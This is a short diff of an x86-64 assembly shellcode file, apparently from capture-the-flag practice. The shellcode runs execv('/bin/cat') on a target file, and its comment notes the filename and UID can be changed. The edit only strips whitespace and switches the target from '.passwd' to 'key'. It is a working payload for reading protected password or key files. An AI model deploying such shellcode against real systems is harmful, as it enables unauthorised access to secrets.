@@ -1,9 +1,9 @@
 	;; execv("/bin/cat", ["/bin/cat", ".passwd"], [])
-	;; You can change the filename and the UID		
+	;; You can change the filename and the UID
 
 	section .text
 	global _start
-	
+
 _start:
 	jmp FILENAME
 RET:
@@ -18,7 +18,7 @@ RET:
 	push rdx
 	push rax
 	push rdi
-	
+
 	xor rax, rax
 	mov rsi, rsp
 	mov al, 59
@@ -26,4 +26,4 @@ RET:
 
 FILENAME:
 	call RET
-filename:	db '.passwd', 0x00
+filename:	db 'key', 0x00
